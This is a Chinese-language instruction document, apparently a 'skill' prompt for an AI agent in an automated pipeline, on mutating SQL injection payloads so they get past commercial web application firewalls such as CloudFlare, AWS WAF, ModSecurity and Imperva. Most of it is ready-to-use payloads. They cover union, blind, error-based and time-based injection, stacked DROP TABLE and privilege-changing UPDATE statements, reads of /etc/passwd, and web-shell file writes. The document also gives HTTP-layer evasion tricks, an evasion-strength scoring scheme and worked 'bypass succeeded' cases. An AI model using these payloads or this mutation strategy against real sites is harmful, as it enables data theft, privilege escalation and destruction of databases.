# SQL 注入语义变异 Skill（生产级）

## 核心任务

基于漏洞语义理解的结果，提出具体的 SQL 注入 `part_operations`，通过改变 SQL Payload 的语法表达方式来绕过 WAF，同时保持原始攻击目标。

## 第一步：攻击类型识别与 WAF 指纹分析

### 1.1 SQL 注入攻击类型识别

根据 `base_parts` 中的 `attack_class` 和语义结构判断：

| 攻击类别 | 典型 Payload | 识别特征 | 核心变异空间 | WAF 常见拦截点 |
|---------|-------------|---------|-------------|---------------|
| **Boolean 盲注** | `' AND 1=1--` | 布尔表达式 | 运算符+谓词+注释 | `AND`, `OR`, `=` 模式 |
| **Union 注入** | `' UNION SELECT 1,2,3--` | UNION 关键字 | UNION 变体+列数+空值 | `UNION SELECT` 关键字 |
| **Error 注入** | `' AND updatexml(...)--` | 错误函数 | 错误函数替换+嵌套 | `updatexml`, `extractvalue` |
| **Time 盲注** | `' AND SLEEP(5)--` | 延时函数 | 延时函数替换+条件包装 | `SLEEP`, `BENCHMARK` |
| **Stacked 堆叠** | `'; DROP TABLE users--` | 多语句分隔符 | 语句替换+分隔符变换 | `;` 分号检测 |
| **读写文件** | `' UNION SELECT LOAD_FILE(...)--` | 文件函数 | 路径编码+函数替换 | `LOAD_FILE`, `INTO OUTFILE` |
| **带外注入** | `' AND ... INTO OUTFILE '\\\\host\\share'--` | 网络函数 | DNS 外传+UNC 路径 | UNC 路径模式 |

### 1.2 数据库类型识别

通过 `base_parts` 或历史查询推断数据库类型：

| 数据库 | 特征函数/语法 | 注释符 | 字符串拼接 | 专有技术 |
|--------|-------------|--------|----------|---------|
| **MySQL** | `CONCAT()`, `SUBSTRING()`, `DATABASE()` | `-- `, `#`, `/**/` | `CONCAT()` | 版本注释 `/*!50000*/` |
| **PostgreSQL** | `CHR()`, `SUBSTRING()`, `CURRENT_DATABASE()` | `--`, `/**/` | `||` | `CAST(...AS TEXT)` |
| **MSSQL** | `LEN()`, `SUBSTRING()`, `DB_NAME()` | `--`, `/**/` | `+` | `EXEC()`, `;` 堆叠 |
| **Oracle** | `LENGTH()`, `SUBSTR()`, `DUAL` | `--`, `/**/` | `||` | `FROM DUAL`, `CHR()` |
| **SQLite** | `LENGTH()`, `SUBSTR()`, `SQLITE_VERSION()` | `--`, `/**/` | `||` | `LOAD_EXTENSION()` |

### 1.3 WAF 指纹识别策略

根据 `waf_context` 中的拦截信息推断 WAF 类型和规则特征：

#### WAF 特征库

| WAF 类型 | 特征签名 | 拦截模式 | 推荐绕过策略 |
|---------|---------|---------|-------------|
| **CloudFlare** | 阻断码 1020 | 关键字黑名单 | 大小写混淆 + 注释插入 + 运算符替换 |
| **AWS WAF** | 403 + `x-amzn-waf` | OWASP CRS + 正则 | 内联注释 + 空白变换 + 编码嵌套 |
| **ModSecurity** | 406 + CRS 规则 | OWASP CRS 3.x | 括号重构 + 子查询包装 + 函数替换 |
| **Imperva** | `_incap_` cookie | 语义分析 | 多样化变异 + 分片组合 + 逻辑等价 |
| **Akamai** | `AkamaiGHost` | 启发式 + ML | 深层嵌套 + 条件包装 + 时间混淆 |
| **F5 ASM** | `TS` cookie | 参数污染检测 | 参数编码 + HTTP 分片 + 协议混淆 |

#### WAF 检测规则类型推断

1. **关键字黑名单型**：拦截特定 SQL 关键字
   - 证据：替换关键字后绕过（如 `UNION` → `UNION ALL`）
   - 绕过：同义词、大小写、注释插入

2. **正则表达式型**：模式匹配
   - 证据：空格变化导致绕过/拦截
   - 绕过：空白替换（`/**/`, `%0a`, 括号）

3. **语法解析型**：SQL 解析器
   - 证据：语法正确的变种被拦截
   - 绕过：深层嵌套、子查询、CASE 表达式

4. **语义分析型**：理解 SQL 语义
   - 证据：逻辑等价的 Payload 也被拦截
   - 绕过：逻辑混淆、多阶段查询、时间差异

## 第二步：分层变异策略（L1-L6）

变异从浅到深分为 6 个层次，**根据 WAF 强度选择合适层次**：

### L1：表面同义替换（针对弱规则）

**适用场景**：关键字黑名单型 WAF

**技术清单**：
- 运算符替换：`AND` → `&&` → `&`, `OR` → `||` → `|`
- 谓词替换：`=` → `LIKE` → `REGEXP` → `RLIKE`
- 函数同义：`SUBSTRING` → `SUBSTR` → `MID`
- 信息函数：`DATABASE()` → `SCHEMA()`, `USER()` → `CURRENT_USER()`

**示例**：
```sql
原始: ' AND 1=1--
L1变异: ' && 1=1--
L1变异: ' AND 1 LIKE 1--
L1变异: ' & 1=1--
```

### L2：空白与注释变换（针对正则匹配）

**适用场景**：正则表达式型 WAF，空白敏感检测

**技术清单**：
- 空白替换：空格 → `/**/` → `%0a` → `%09` → 括号
- 注释插入：关键字内插 `UN/**/ION`, `SEL/**/ECT`
- 注释类型：`-- ` → `-- -` → `#` → `/**/` → `;%00`
- 括号消除：`OR 1=1` → `OR(1)=(1)` → `OR(1=1)`

**示例**：
```sql
原始: ' UNION SELECT 1,2,3--
L2变异: '/**/UNION/**/SELECT/**/1,2,3--
L2变异: '%0aUNION%0aSELECT%0a1,2,3--
L2变异: '/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--
L2变异: 'UNION(SELECT(1),2,3)--
```

### L3：编码与大小写混淆（针对模式匹配）

**适用场景**：字符串模式匹配型 WAF

**技术清单**：
- 大小写混合：`SELECT` → `SeLeCt` → `sELECT`
- 十六进制：`'admin'` → `0x61646D696E`
- CHAR 构造：`'admin'` → `CHAR(97,100,109,105,110)`
- 科学计数：`1` → `1e0` → `1.0`
- URL 编码：`%27` → `%2527` → `%%2727`

**示例**：
```sql
原始: ' UNION SELECT 1,2,3--
L3变异: ' UnIoN SeLeCt 1,2,3--
L3变异: ' UNION SELECT 0x31,0x32,0x33--
L3变异: ' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
L3变异: ' UNION SELECT 1e0,2e0,3e0--
```

### L4：子查询与嵌套（针对语法检测）

**适用场景**：SQL 语法解析型 WAF

**技术清单**：
- 子查询包装：`1=1` → `1=(SELECT 1)`
- 值包装：`'admin'` → `(SELECT 'admin')`
- 嵌套查询：`UNION SELECT 1` → `UNION SELECT(SELECT 1)`
- CASE 表达式：`1=1` → `CASE WHEN 1=1 THEN 1 ELSE 0 END`
- IF 包装：`1=1` → `IF(1=1,1,0)`

**示例**：
```sql
原始: ' AND 1=1--
L4变异: ' AND 1=(SELECT 1)--
L4变异: ' AND (SELECT 1)=(SELECT 1)--
L4变异: ' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--
L4变异: ' AND IF(1=1,1,0)--
```

### L5：逻辑等价变换（针对语义分析）

**适用场景**：语义分析型 WAF，理解 SQL 逻辑

**技术清单**：
- 逻辑重组：`A AND B` → `NOT(NOT A OR NOT B)`
- 恒真变换：`1=1` → `'a'='a'` → `9>8` → `1 BETWEEN 0 AND 2`
- 恒假变换：`1=0` → `'a'='b'` → `1>2`
- 位运算：`1=1` → `1&1` → `1|0` → `1^0`
- 算术等价：`2` → `1+1` → `3-1` → `4/2`

**示例**：
```sql
原始: ' AND 1=1--
L5变异: ' AND 'a'='a'--
L5变异: ' AND 9>8--
L5变异: ' AND 1 BETWEEN 0 AND 2--
L5变异: ' AND NOT(1=0)--
L5变异: ' AND NOT(1<>1)--
```

### L6：数据库特性深度利用（针对最强 WAF）

**适用场景**：机器学习型 WAF，多层防护

**技术清单**：
- **MySQL**：版本条件注释 `/*!50000SELECT*/`
- **MySQL**：科学计数 + 浮点：`1.e1` → `0e0+1`
- **PostgreSQL**：`CAST(...AS INT)`, `::int` 类型转换
- **MSSQL**：变量声明 `DECLARE @a INT`
- **Oracle**：`FROM DUAL` 必选子句
- **多数据库**：存储过程调用、临时表、WITH 子句

**示例**：
```sql
-- MySQL 版本注释
原始: ' UNION SELECT 1,2,3--
L6变异: '/*!50000UNION*//*!50000SELECT*/1,2,3--
L6变异: '/*!12345UNION*//*!12345SELECT*/1,2,3#

-- PostgreSQL CAST
原始: ' AND 1=1--
L6变异: ' AND '1'::int='1'::int--
L6变异: ' AND CAST('1' AS INT)=CAST('1' AS INT)--

-- MSSQL 变量
原始: ' UNION SELECT 1,2,3--
L6变异: ';DECLARE @a INT;SET @a=1;SELECT @a,2,3--

-- Oracle DUAL
原始: ' UNION SELECT 1,2,3--
L6变异: ' UNION SELECT 1,2,3 FROM DUAL--
```

## 第三步：针对主流 WAF 的专用绕过技术

### 3.1 CloudFlare 绕过技术

**特征**：关键字黑名单 + 简单正则

**绕过策略**：
1. **大小写混淆**
2. **注释插入**打断关键字
3. **运算符替换**

**实战 Payload**：
```sql
-- 原始被拦截
' UNION SELECT 1,2,3--

-- 绕过 1：大小写混淆
' UnIoN SeLeCt 1,2,3--

-- 绕过 2：注释插入
' UN/**/ION SE/**/LECT 1,2,3--

-- 绕过 3：换行符
' UNION%0aSELECT%0a1,2,3--

-- 绕过 4：括号重构
' UNION(SELECT(1),2,3)--

-- 绕过 5：内联注释（MySQL）
'/*!50000UNION*//*!50000SELECT*/1,2,3#
```

### 3.2 AWS WAF 绕过技术

**特征**：OWASP CRS + 正则匹配

**绕过策略**：
1. **内联注释**和**空白变换**
2. **双重编码**
3. **HTTP 参数污染**

**实战 Payload**：
```sql
-- 原始被拦截
' AND 1=1--

-- 绕过 1：注释空白混合
'/**/AND/**/1=1--
'%0aAND%0a1=1--

-- 绕过 2：括号消除空白依赖
'/**/AND/**/(1)=(1)--
'AND(1)LIKE(1)--

-- 绕过 3：双重编码
'%2520AND%25201=1--

-- 绕过 4：运算符替换
'&&1=1--
'%26%261=1--

-- 绕过 5：逻辑等价
'AND'1'='1'--
'AND+9>8--
```

### 3.3 ModSecurity (OWASP CRS) 绕过技术

**特征**：OWASP Core Rule Set，多层正则

**绕过策略**：
1. **子查询包装**
2. **CASE 表达式**
3. **函数嵌套**

**实战 Payload**：
```sql
-- 原始被拦截
' UNION SELECT user(),password FROM mysql.user--

-- 绕过 1：子查询包装
' UNION SELECT(SELECT user()),(SELECT password)FROM mysql.user--

-- 绕过 2：CASE 表达式
' UNION SELECT CASE WHEN 1=1 THEN user()END,password FROM mysql.user--

-- 绕过 3：函数嵌套 + 注释
' UN/**/ION SEL/**/ECT CONCAT(user()),password FROM mysql.user--

-- 绕过 4：十六进制编码
' UNION SELECT 0x61646D696E,password FROM mysql.user--

-- 绕过 5：科学计数 + 注释
'/**/UNION/**/SELECT/**/1e0,2e0,3e0--
```

### 3.4 Imperva/Incapsula 绕过技术

**特征**：语义分析 + 机器学习

**绕过策略**：
1. **多样化变异**避免模式重复
2. **分片组合**（多次请求）
3. **时间混淆**

**实战 Payload**：
```sql
-- 原始被拦截
' AND SLEEP(5)--

-- 绕过 1：延时函数替换
' AND BENCHMARK(10000000,MD5(1))--
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--

-- 绕过 2：条件包装
' AND IF(1=1,SLEEP(5),0)--
' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--

-- 绕过 3：逻辑重组
' AND (SELECT IF(1=1,SLEEP(5),0))--
' AND (SELECT CASE WHEN '1'='1' THEN SLEEP(5)END)--

-- 绕过 4：多阶段注入
-- 第一次：注入变量
';SET @a=0x53454c45435420312c322c33;--
-- 第二次：执行变量
';PREPARE stmt FROM @a;EXECUTE stmt;--
```

### 3.5 Akamai 绕过技术

**特征**：CDN 级防护，启发式检测

**绕过策略**：
1. **深层嵌套**
2. **HTTP 协议层混淆**
3. **条件表达式**

**实战 Payload**：
```sql
-- 原始被拦截
' UNION SELECT 1,2,3--

-- 绕过 1：深层嵌套
' UNION SELECT(SELECT(SELECT 1)),2,3--

-- 绕过 2：WITH 子句（PostgreSQL）
' UNION(WITH a AS(SELECT 1)SELECT*FROM a),2,3--

-- 绕过 3：临时表（MSSQL）
';CREATE TABLE #t(a INT);INSERT #t VALUES(1);SELECT a,2,3 FROM #t--

-- 绕过 4：CAST 嵌套
' UNION SELECT CAST(CAST(1 AS CHAR)AS INT),2,3--

-- 绕过 5：存储过程（MySQL）
';CALL sp_executesql N'SELECT 1,2,3'--
```

### 3.6 F5 ASM 绕过技术

**特征**：参数污染检测 + 协议分析

**绕过策略**：
1. **参数编码**
2. **HTTP 头部注入**
3. **HPP (HTTP Parameter Pollution)**

**实战 Payload**：
```sql
-- HPP 参数污染
?id=1' UNION SELECT 1&id=,2,3--

-- HTTP 头部注入
X-Forwarded-For: ' UNION SELECT 1,2,3--

-- Cookie 注入
Cookie: session=' UNION SELECT 1,2,3--

-- JSON 注入
{"id":"1' UNION SELECT 1,2,3--"}

-- 分块传输编码
1\r\n'\r\n5\r\n UNION\r\n...
```

## 第四步：按攻击类别的专项技术

### 4.1 Boolean 盲注专项

**核心目标**：通过布尔条件判断数据

**WAF 拦截点**：`AND`, `OR`, `=`, `LIKE` 等逻辑运算符

**变异技术库**：

#### 运算符替换
```sql
-- 原始
' AND 1=1--

-- 变异 1：符号运算符
' && 1=1--
' & 1=1--
' AND 1 LIKE 1--

-- 变异 2：位运算
' AND 1&1--
' AND 1|0--
' AND 1^0--
' AND ~0==-1--

-- 变异 3：算术比较
' AND 2>1--
' AND 1<2--
' AND 1 BETWEEN 0 AND 2--
' AND 1 IN(1)--

-- 变异 4：字符串比较
' AND 'a'='a'--
' AND 'a' LIKE 'a'--
' AND 'a' REGEXP 'a'--
```

#### 谓词替换
```sql
-- 原始
' AND username='admin'--

-- 变异 1：LIKE 模糊匹配
' AND username LIKE 'admin'--
' AND username LIKE 'admi%'--

-- 变异 2：REGEXP 正则
' AND username REGEXP '^admin$'--
' AND username RLIKE 'admin'--

-- 变异 3：字符串函数
' AND SUBSTRING(username,1,5)='admin'--
' AND LEFT(username,5)='admin'--
' AND STRCMP(username,'admin')=0--

-- 变异 4：INSTR/LOCATE
' AND INSTR(username,'admin')>0--
' AND LOCATE('admin',username)>0--
' AND FIND_IN_SET('admin',username)--
```

#### 逻辑重组
```sql
-- 原始
' AND (1=1 AND 2=2)--

-- 变异 1：德摩根定律
' AND NOT(1=0 OR 2=3)--
' AND NOT(NOT(1=1)OR NOT(2=2))--

-- 变异 2：冗余条件
' AND 1=1 AND 1=1--
' AND (1=1)AND(1=1)--

-- 变异 3：恒真嵌套
' AND 1=1 OR 1=0--
' AND (1=1 OR(SELECT 0))--
```

### 4.2 Union 注入专项

**核心目标**：联合查询获取数据

**WAF 拦截点**：`UNION SELECT` 关键字组合

**变异技术库**：

#### UNION 变体
```sql
-- 原始
' UNION SELECT 1,2,3--

-- 变异 1：UNION ALL
' UNION ALL SELECT 1,2,3--

-- 变异 2：括号包装
' UNION(SELECT 1,2,3)--
' UNION(SELECT(1),2,3)--

-- 变异 3：注释插入
' UN/**/ION SE/**/LECT 1,2,3--
' UNI%00ON SEL%00ECT 1,2,3--

-- 变异 4：大小写混淆
' UnIoN SeLeCt 1,2,3--
' uNIOn sELECt 1,2,3--

-- 变异 5：空白变换
' UNION%0aSELECT%0a1,2,3--
'/**/UNION/**/SELECT/**/1,2,3--
' UNION%09SELECT%091,2,3--
```

#### 列值变体
```sql
-- 原始
' UNION SELECT 1,2,3--

-- 变异 1：NULL 值
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,NULL,3--

-- 变异 2：十六进制
' UNION SELECT 0x31,0x32,0x33--

-- 变异 3：CHAR 函数
' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--

-- 变异 4：子查询
' UNION SELECT(SELECT 1),(SELECT 2),(SELECT 3)--

-- 变异 5：CONCAT
' UNION SELECT CONCAT(1,2),3,4--

-- 变异 6：科学计数
' UNION SELECT 1e0,2e0,3e0--

-- 变异 7：浮点数
' UNION SELECT 1.0,2.0,3.0--
```

#### 列数探测绕过
```sql
-- 原始
' ORDER BY 3--

-- 变异 1：表达式
' ORDER BY 1+2--
' ORDER BY 2*1+1--
' ORDER BY 3-0--

-- 变异 2：子查询
' ORDER BY(SELECT 3)--

-- 变异 3：CASE 表达式
' ORDER BY CASE WHEN 1=1 THEN 3 ELSE 1 END--

-- 变异 4：注释混淆
' ORDER/**/BY/**/3--
```

### 4.3 Error 注入专项

**核心目标**：通过报错信息获取数据

**WAF 拦截点**：`updatexml`, `extractvalue`, `exp` 等报错函数

**变异技术库**：

#### 报错函数替换
```sql
-- MySQL UpdateXML
' AND updatexml(1,concat(0x7e,database()),1)--

-- 变异 1：ExtractValue
' AND extractvalue(1,concat(0x7e,database()))--

-- 变异 2：GTID 函数（MySQL 5.6+）
' AND gtid_subset(concat(0x7e,database()),1)--
' AND gtid_subtract(concat(0x7e,database()),1)--

-- 变异 3：EXP 溢出
' AND exp(~(SELECT*FROM(SELECT database())a))--

-- 变异 4：GeometryCollection
' AND geometrycollection((SELECT*FROM(SELECT database())a))--

-- 变异 5：Polygon
' AND polygon((SELECT*FROM(SELECT database())a))--

-- 变异 6：MultiPoint
' AND multipoint((SELECT*FROM(SELECT database())a))--

-- 变异 7：MultiLineString
' AND multilinestring((SELECT*FROM(SELECT database())a))--

-- 变异 8：MultiPolygon
' AND multipolygon((SELECT*FROM(SELECT database())a))--

-- 变异 9：LineString
' AND linestring((SELECT*FROM(SELECT database())a))--
```

#### 函数嵌套与编码
```sql
-- 原始
' AND updatexml(1,concat(0x7e,database()),1)--

-- 变异 1：子查询包装
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- 变异 2：CHAR 编码分隔符
' AND updatexml(1,concat(CHAR(126),database()),1)--

-- 变异 3：多层嵌套
' AND updatexml(1,concat(0x7e,(SELECT(SELECT database()))),1)--

-- 变异 4：CASE 包装
' AND updatexml(1,CASE WHEN 1=1 THEN concat(0x7e,database())END,1)--
```

### 4.4 Time 盲注专项

**核心目标**：通过延时判断条件真假

**WAF 拦截点**：`SLEEP`, `BENCHMARK`, `GET_LOCK` 等延时函数

**变异技术库**：

#### 延时函数替换
```sql
-- MySQL SLEEP
' AND SLEEP(5)--

-- 变异 1：BENCHMARK
' AND BENCHMARK(10000000,MD5(1))--
' AND BENCHMARK(10000000,SHA1(1))--
' AND BENCHMARK(10000000,ENCODE('a','b'))--

-- 变异 2：笛卡尔积延时
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--
' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--

-- 变异 3：GET_LOCK（MySQL）
' AND GET_LOCK('a',5)--
' AND RELEASE_LOCK('a')--

-- 变异 4：RPAD/REPEAT 资源消耗
' AND (SELECT RPAD('a',999999,'a') RLIKE '.*')--
' AND (SELECT REPEAT('a',999999) RLIKE '.*')--

-- 变异 5：正则回溯（PostgreSQL）
' AND (SELECT 'aaaaaaaaaaaaaaaaaaaaaaaaa' ~ 'a+a+a+a+a+a+a+a+a+a+a+a+$')--

-- 变异 6：PG_SLEEP（PostgreSQL）
' AND pg_sleep(5)--

-- 变异 7：WAITFOR（MSSQL）
'; WAITFOR DELAY '00:00:05'--
```

#### 条件包装
```sql
-- 原始
' AND IF(1=1,SLEEP(5),0)--

-- 变异 1：CASE 表达式
' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--

-- 变异 2：子查询包装
' AND (SELECT IF(1=1,SLEEP(5),0))--
' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5)END)--

-- 变异 3：逻辑短路
' AND 1=1 AND SLEEP(5)--
' AND 1=0 OR SLEEP(5)--

-- 变异 4：ELT 函数
' AND ELT(1=1,SLEEP(5))--

-- 变异 5：FIELD 函数
' AND FIELD(1=1,SLEEP(5))--
```

### 4.5 Stacked 堆叠注入专项

**核心目标**：执行多条 SQL 语句

**WAF 拦截点**：`;` 分号分隔符，多语句检测

**变异技术库**：

#### 分隔符变换
```sql
-- 原始
'; DROP TABLE users--

-- 变异 1：多分号
';; DROP TABLE users--
';;; DROP TABLE users--

-- 变异 2：换行符
'%0aDROP TABLE users--
'%0d%0aDROP TABLE users--

-- 变异 3：注释分隔
';/* comment */DROP TABLE users--
';-- comment%0aDROP TABLE users--

-- 变异 4：NULL 字节（某些环境）
';%00DROP TABLE users--
```

#### 语句类型变换
```sql
-- 原始
'; DROP TABLE users--

-- 变异 1：CREATE 语句
'; CREATE TABLE test(a INT)--

-- 变异 2：INSERT 语句
'; INSERT INTO users VALUES(1,'hacker')--

-- 变异 3：UPDATE 语句
'; UPDATE users SET role='admin' WHERE id=1--

-- 变异 4：DELETE 语句
'; DELETE FROM users WHERE id=1--

-- 变异 5：存储过程
'; CALL sp_executesql('SELECT 1')--

-- 变异 6：变量声明（MSSQL）
'; DECLARE @a INT;SET @a=1;SELECT @a--
```

### 4.6 读写文件专项

**核心目标**：读取或写入服务器文件

**WAF 拦截点**：`LOAD_FILE`, `INTO OUTFILE`, 文件路径模式

**变异技术库**：

#### 文件读取函数
```sql
-- MySQL LOAD_FILE
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- 变异 1：十六进制编码路径
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--

-- 变异 2：CHAR 构造路径
' UNION SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))--

-- 变异 3：子查询包装
' UNION SELECT(SELECT LOAD_FILE('/etc/passwd'))--

-- 变异 4：CONCAT 动态路径
' UNION SELECT LOAD_FILE(CONCAT('/etc/','passwd'))--

-- 变异 5：REPLACE 构造
' UNION SELECT LOAD_FILE(REPLACE('/etc/XXXXX','XXXXX','passwd'))--
```

#### 文件写入绕过
```sql
-- 原始
' UNION SELECT 'shell' INTO OUTFILE '/var/www/shell.php'--

-- 变异 1：DUMPFILE 替代
' UNION SELECT 'shell' INTO DUMPFILE '/var/www/shell.php'--

-- 变异 2：路径编码
' UNION SELECT 'shell' INTO OUTFILE 0x2f7661722f7777772f7368656c6c2e706870--

-- 变异 3：FIELDS/LINES 控制
' UNION SELECT 'shell' INTO OUTFILE '/tmp/x' FIELDS TERMINATED BY ''--
' UNION SELECT 'shell' INTO OUTFILE '/tmp/x' LINES TERMINATED BY ''--

-- 变异 4：权限提升路径
' UNION SELECT 'shell' INTO OUTFILE '/tmp/shell.php'--
```

## 第五步：组合攻击策略

### 5.1 多维度组合变异

**原理**：同时应用多个层次的技术

**组合公式**：
```
高强度变异 = L2(空白变换) + L3(编码混淆) + L4(子查询嵌套) + L5(逻辑等价)
```

**示例**：
```sql
<!-- 原始 -->
' UNION SELECT user,password FROM users--

<!-- 单维度 L2 -->
'/**/UNION/**/SELECT/**/user,password/**/FROM/**/users--

<!-- 组合 L2+L3 -->
'/**/UnIoN/**/SeLeCt/**/user,password/**/FROM/**/users--

<!-- 组合 L2+L3+L4 -->
'/**/UnIoN/**/SeLeCt/**/(SELECT user),(SELECT password)/**/FROM/**/users--

<!-- 组合 L2+L3+L4+L5 -->
'/**/UnIoN/**/SeLeCt/**/(SELECT(SELECT user)),(SELECT(SELECT password))/**/FROM/**/users/**/WHERE/**/'a'='a'--
```

### 5.2 分片与重组策略

**原理**：将 Payload 拆分到多个请求/参数，服务器端重组

**场景**：绕过单次请求长度限制、完整性检测

**示例**：
```sql
-- 分片 1：注入 UNION 部分
?id=1' UNION /*

-- 分片 2：注入 SELECT 部分（通过其他参数）
&name=*/ SELECT 1,2,3--

-- 服务器拼接后：
SELECT * FROM table WHERE id='1' UNION /* */ SELECT 1,2,3--'
```

### 5.3 HTTP 层面绕过

**原理**：利用 HTTP 协议特性绕过 WAF

**技术清单**：
1. **HPP（HTTP Parameter Pollution）**
2. **HTTP 方法变换**（GET → POST → PUT）
3. **Content-Type 混淆**
4. **分块传输编码**
5. **多部分表单数据**

**示例**：
```http
-- HPP 参数污染
GET /?id=1'&id=UNION&id=SELECT&id=1,2,3--

-- POST JSON 注入
POST /api/user HTTP/1.1
Content-Type: application/json

{"id":"1' UNION SELECT 1,2,3--"}

-- 分块传输
POST / HTTP/1.1
Transfer-Encoding: chunked

3
1'
6
 UNION
7
 SELECT
6
 1,2,3
2
--
0
```

## 第六步：变异质量评分体系

### 6.1 变异强度评分

```
变异强度分 = 语义距离分(25%) + WAF规避分(40%) + 攻击效果分(25%) + 稳定性分(10%)
```

#### 语义距离分（0-25分）

- L1 同义替换：3-8 分
- L2 空白变换：8-12 分
- L3 编码混淆：12-16 分
- L4 子查询嵌套：16-20 分
- L5 逻辑等价：20-23 分
- L6 数据库特性：23-25 分

#### WAF 规避分（0-40分）

- 通用技术：10-20 分
- WAF 特定技术：20-30 分
- 组合技术（2+ 层次）：30-35 分
- 深度组合（3+ 层次）：35-40 分

#### 攻击效果分（0-25分）

- 保持攻击类别：5 分（必选）
- 保持查询逻辑：10 分
- 数据完整性：15 分
- 执行成功率预估：20-25 分

#### 稳定性分（0-10分）

- 单数据库兼容：3-5 分
- 多数据库兼容：5-7 分
- 全数据库兼容：7-10 分

### 6.2 候选去重策略

**核心部件指纹**：
```python
# Boolean 型
fingerprint = (operator_type, predicate_type, value_type)
# 示例：('AND', 'LIKE', 'subquery')

# Union 型
fingerprint = (union_variant, column_value_types, null_count)
# 示例：('UNION ALL', ['int','hex','char'], 1)

# Time 型
fingerprint = (delay_function, condition_wrapper, delay_value)
# 示例：('BENCHMARK', 'IF', 10000000)
```

**相似度阈值**：< 65%

**多样性保证**：
- 每轮至少包含：1个L2 + 1个L3 + 1个L4 + 1个L5
- 覆盖至少 3 种不同的技术分类

## 第七步：实战案例库

### 案例 1：绕过 CloudFlare 的 Boolean 盲注

**场景**：`' AND 1=1--` 被拦截

**分析**：
- WAF：CloudFlare
- 拦截关键字：`AND`, `=`
- 推荐层次：L2 + L3

**变异过程**：
```sql
步骤 1（L1）：运算符替换
' AND 1=1-- → ' && 1=1--
[结果: 仍被拦截，= 号被检测]

步骤 2（L1+L1）：组合运算符替换
' && 1=1-- → ' && 1 LIKE 1--
[结果: 仍被拦截，LIKE 也在黑名单]

步骤 3（L2）：注释插入
' && 1 LIKE 1-- → '/**/&&/**/1/**/LIKE/**/1--
[结果: 绕过成功！]
```

### 案例 2：绕过 AWS WAF 的 Union 注入

**场景**：`' UNION SELECT 1,2,3--` 被拦截

**分析**：
- WAF：AWS WAF + OWASP CRS
- 拦截模式：`UNION SELECT` 关键字组合
- 推荐层次：L2 + L3 + L4

**变异过程**：
```sql
步骤 1（L2）：注释插入
' UNION SELECT 1,2,3-- → ' UN/**/ION SE/**/LECT 1,2,3--
[结果: 仍被拦截，模式仍可识别]

步骤 2（L3）：大小写混淆
' UN/**/ION SE/**/LECT 1,2,3-- → ' Un/**/IoN Se/**/LeCt 1,2,3--
[结果: 仍被拦截]

步骤 3（L4）：子查询包装
' Un/**/IoN Se/**/LeCt 1,2,3-- → ' Un/**/IoN Se/**/LeCt(SELECT 1),2,3--
[结果: 绕过成功！]
```

### 案例 3：绕过 ModSecurity 的 Time 盲注

**场景**：`' AND SLEEP(5)--` 被拦截

**分析**：
- WAF：ModSecurity + CRS 3.3
- 拦截函数：`SLEEP`
- 推荐层次：L4 + L5

**变异过程**：
```sql
步骤 1（L1）：延时函数替换
' AND SLEEP(5)-- → ' AND BENCHMARK(10000000,MD5(1))--
[结果: 仍被拦截，BENCHMARK 也在黑名单]

步骤 2（L4）：条件包装
' AND BENCHMARK(...,MD5(1))-- → ' AND IF(1=1,BENCHMARK(10000000,MD5(1)),0)--
[结果: 仍被拦截]

步骤 3（L5）：逻辑等价 + 笛卡尔积
' AND IF(1=1,BENCHMARK...)-- → ' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B WHERE 'a'='a')--
[结果: 绕过成功！用笛卡尔积实现延时]
```

### 案例 4：绕过 Imperva 的 Error 注入

**场景**：`' AND updatexml(1,concat(0x7e,database()),1)--` 被拦截

**分析**：
- WAF：Imperva（语义分析）
- 拦截函数：`updatexml` + `concat` 组合
- 推荐层次：L1 + L4

**变异过程**：
```sql
步骤 1（L1）：报错函数替换
' AND updatexml(1,concat(0x7e,database()),1)--
→ ' AND extractvalue(1,concat(0x7e,database()))--
[结果: 仍被拦截，extractvalue 同样检测]

步骤 2（L1再次）：使用冷门报错函数
→ ' AND gtid_subset(concat(0x7e,database()),1)--
[结果: 仍被拦截]

步骤 3（L4）：多层嵌套 + 子查询
→ ' AND exp(~(SELECT*FROM(SELECT database())a))--
[结果: 绕过成功！EXP 溢出报错]
```

## 变异原则检查清单

每轮提出操作前，确认：

### 基础约束
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码（属于编码 Agent 的职责，除非 L3 层需要）
- [ ] 保持了原始攻击目标（Boolean/Union/Time/Error 等）
- [ ] 没有引入破坏性操作（除非 Stacked 类攻击本身要求）

### 变异策略
- [ ] 已识别数据库类型（MySQL/PostgreSQL/MSSQL/Oracle）
- [ ] 已识别 WAF 类型或推断规则特征
- [ ] 选择的变异层次匹配 WAF 强度
- [ ] 优先选择 `available_directions` 中未使用的方向
- [ ] 组合变异时，技术来自不同层次（L2+L3+L4）

### 攻击类别保持
- [ ] **保持攻击类别**（`attack_class`）：
  - Boolean 类 → 保持布尔判断逻辑
  - Union 类 → 保持 UNION 结构和列数
  - Time 类 → 保持延时效果
  - Error 类 → 保持报错函数
  - Stacked 类 → 保持多语句分隔
- [ ] **不跨类别转换**：不要把 Time 改成 Boolean，不要把 Union 改成 Error

### 质量保证
- [ ] 与本轮其他候选**在核心技术层面**显著不同
- [ ] 候选间相似度 < 65%
- [ ] 每轮至少包含：1个L2 + 1个L3 + 1个L4 + 1个L5 候选
- [ ] 变异强度评分 > 60 分
- [ ] 数据库兼容性：至少支持目标数据库类型

## 附录：快速参考表

### WAF 识别速查

| 拦截特征 | WAF 类型 | 首选绕过 |
|---------|---------|---------|
| 阻断码 1020 | CloudFlare | 大小写 + 注释插入 |
| `x-amzn-waf` | AWS WAF | 内联注释 + 空白变换 |
| 406 + CRS | ModSecurity | 子查询 + CASE 表达式 |
